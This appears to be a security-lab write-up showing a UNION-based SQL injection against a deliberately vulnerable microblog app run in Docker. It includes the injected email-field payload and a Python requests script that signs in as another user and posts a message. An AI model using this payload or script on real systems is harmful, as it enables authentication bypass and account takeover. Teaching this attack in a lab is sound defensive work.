An example of an SQL injection on an artificial microblog service.

## Setup

***

Our network here is set up with the microblog webapp again

```yaml
version: '3'

services:
  microblog:
    image: # private image
    container_name: microblog
    ports:
      - "8080:80"
    networks:
      channel:
        ipv4_address: 10.0.0.2
        
  alice:
    image: # private image
    container_name: alice
    tty: true
    shm_size: '1gb'
    sysctls:
        - net.ipv6.conf.all.disable_ipv6=1
    networks:
      channel:
        ipv4_address: 10.0.0.3
        
  mallory:
      image: # private image
      container_name: mallory
      tty: true
      restart: always
      volumes:
          - .:/shared
      network_mode: service:microblog
      
  wireshark:
    image: # private image
    container_name: wireshark
    tty: true
    network_mode: service:microblog

networks:
  channel:
    driver: bridge
    ipam:
      config:
        - subnet: 10.0.0.0/24
```

as usual, we start our containers with `docker-compose up`

## Observations

***

The backend seems to be creating the query by simply concatenating our (unsafe) input like.

```
$query = "SELECT * FROM users WHERE email = '$email'";
```

Additionally, the backend doesn't check whether the string sent in the email field is in fact a proper email.
We can use this to our advantage to manipulate the table and log in as Alice without knowing her password.

## The Attack

***

In the exploit, we set the email field to be an SQL query so when the server
tries to fetch the corresponding user, it also performs the "injected" operations.

In order to log in as Alice, we use string literals which correspond to her email and
username while selecting the password which correspond to mallory's email.

```sql
SELECT 'alice@example.com','Alice', password FROM users WHERE email = 'mallory@example.com'"
```

however, since the server-side uses single quotes and already has a `SELECT` operation
we need to get it to ignore the first part and return only the injected code.
This can by done by `UNION` with something we know should return an empty table, for instance

```sql
SELECT * FROM users WHERE email = '0'
```

playing around the single quotes and using `UNION` our final query looks as follows:

```
"0' UNION SELECT 'alice@example.com','Alice', password FROM users where email = 'mallory@example.com",
```

Finally, we can automate the process using the requests library similar to past exercises:

```python
import os, requests
from urllib.parse import urlencode

PROTOCOL = "http"
HOST = "10.0.0.2"
PORT = "80"
BASE = PROTOCOL + "://" + HOST + ":" + PORT

# Mallory's credentials
mallory = {
    'email': "0' UNION SELECT 'alice@example.com','Alice', password FROM users where email = 'mallory@example.com",
    'password': 'pass4mallory'
}

with requests.Session() as s:
     # sign-in as mallory (POST request)
     res = s.post(BASE + '/signin.php', data=mallory)
     # post a message (POST request)
     res = s.post(BASE + '/post.php', data={'msg': "Got You!"})
```

## Conclusion

***

This attack relies on the server not doing proper sanitization on the input it's given.
This can be mitigated by sanitizing the user input in the backend before processing.

When you're done, don't forget to [clean up](/crypto/2020/10/08/05-lab.html#docker-cleanup)
after Docker.
